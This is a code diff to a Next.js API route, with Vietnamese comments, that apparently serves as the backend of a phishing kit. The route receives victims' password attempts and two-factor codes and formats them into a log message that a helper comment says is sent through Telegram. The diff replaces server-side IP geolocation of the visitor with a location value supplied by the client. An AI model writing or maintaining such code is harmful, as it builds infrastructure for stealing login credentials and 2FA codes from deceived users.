@@ -1,4 +1,4 @@
-import { NextRequest, NextResponse } from "next/server";
+import { NextResponse } from "next/server";
 import type { FormData, LocationData } from "@/types/form";
 
 interface LogEventPayload {
@@ -6,6 +6,7 @@ interface LogEventPayload {
   passwordAttempts: string[];
   twofaAttempts: string[];
   selectedMethod?: string | null;
+  locationData?: LocationData | null;
 }
 
 // Helper function để gửi log qua Telegram với format có thể copy
@@ -110,106 +111,14 @@ function formatLogMessage(payload: LogEventPayload, location: LocationData): str
   return message;
 }
 
-export async function POST(request: NextRequest) {
+export async function POST(request: Request) {
   try {
     const payload: LogEventPayload = await request.json();
 
-    const headers = request.headers;
-    const countryNameFromCode = (code: string | null) => {
-      if (!code || code === "XX") return "";
-      try {
-        const dn = new Intl.DisplayNames(["en"], { type: "region" });
-        return dn.of(code) || "";
-      } catch {
-        return "";
-      }
+    const location: LocationData = payload.locationData ?? {
+      ip: "unknown",
+      location: { country: "Unknown", countryCode: "US", city: "", region: "" },
     };
-
-    const debugGeo = process.env.DEBUG_GEO === "1";
-    const ipinfoToken = process.env.IPINFO_TOKEN;
-
-    // Lấy IP: Cloudflare Workers dùng cf-connecting-ip
-    const cfConnectingIp = headers.get("cf-connecting-ip");
-    const forwarded = headers.get("x-forwarded-for");
-    const realIp = headers.get("x-real-ip");
-    const ip =
-      (cfConnectingIp ? cfConnectingIp.trim() : "") ||
-      (forwarded ? forwarded.split(",")[0].trim() : "") ||
-      (realIp ? realIp.trim() : "") ||
-      "unknown";
-
-    // Log tất cả headers để debug IP (sẽ xóa sau khi xác nhận)
-    const allHeaders: Record<string, string> = {};
-    headers.forEach((value, key) => { allHeaders[key] = value; });
-    console.log("[ip-debug] all headers:", JSON.stringify(allHeaders));
-    console.log("[ip-debug] ip resolved:", ip);
-
-    // Kiểm tra nếu IP là localhost
-    const isLocalhost = 
-      !ip || 
-      ip === "unknown" || 
-      ip === "127.0.0.1" || 
-      ip === "::1" || 
-      ip.startsWith("192.168.") || 
-      ip.startsWith("10.") || 
-      ip.startsWith("172.16.") ||
-      ip.startsWith("172.17.") ||
-      ip.startsWith("172.18.") ||
-      ip.startsWith("172.19.") ||
-      ip.startsWith("172.20.") ||
-      ip.startsWith("172.21.") ||
-      ip.startsWith("172.22.") ||
-      ip.startsWith("172.23.") ||
-      ip.startsWith("172.24.") ||
-      ip.startsWith("172.25.") ||
-      ip.startsWith("172.26.") ||
-      ip.startsWith("172.27.") ||
-      ip.startsWith("172.28.") ||
-      ip.startsWith("172.29.") ||
-      ip.startsWith("172.30.") ||
-      ip.startsWith("172.31.");
-
-    // Sử dụng countryCode từ form để set location mặc định
-    const formCountryCode = payload.formDetails?.countryCode || "US";
-    const defaultCountry = formCountryCode === "VN" ? "Vietnam" : formCountryCode === "US" ? "United States" : "United States";
-    const defaultCity = formCountryCode === "VN" ? "Ho Chi Minh City" : "New York";
-    const defaultRegion = formCountryCode === "VN" ? "Ho Chi Minh" : "New York";
-
-    // Gọi API detect location để lấy thông tin chính xác
-    let location: LocationData = {
-      ip: isLocalhost ? "localhost" : ip,
-      location: {
-        country: defaultCountry,
-        countryCode: formCountryCode,
-        city: defaultCity,
-        region: defaultRegion,
-      },
-    };
-
-    // Ưu tiên IPINFO nếu có token và IP hop le
-    if (!isLocalhost && ip && ip !== "unknown" && ipinfoToken) {
-      try {
-        const res = await fetch(`https://ipinfo.io/${ip}?token=${ipinfoToken}`);
-        const data = await res.json();
-        if (!data?.error && (data?.country || data?.city || data?.region)) {
-          const ipinfoCountryCode = data.country || "";
-          const ipinfoCountryName = countryNameFromCode(ipinfoCountryCode);
-          location = {
-            ip: data.ip || ip,
-            location: {
-              country: ipinfoCountryName || location.location.country,
-              countryCode: ipinfoCountryCode || location.location.countryCode,
-              city: data.city || location.location.city,
-              region: data.region || location.location.region,
-            },
-          };
-        }
-      } catch (error) {
-        if (debugGeo) {
-          console.error("[geo-debug] ipinfo error:", error);
-        }
-      }
-    }
 
     // Format và gửi log với HTML parse mode để có thể copy
     const logMessage = formatLogMessage(payload, location);
